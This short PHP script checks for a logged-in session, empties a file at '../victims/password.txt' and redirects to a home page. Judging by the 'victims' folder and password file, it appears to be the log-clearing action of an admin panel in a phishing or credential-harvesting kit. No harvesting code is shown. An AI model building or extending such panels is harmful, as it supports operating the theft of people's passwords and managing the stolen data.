<?php 
session_start(); /* Starts the session */
if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
file_put_contents("../victims/password.txt", "");
header("Location:./home.php");
?>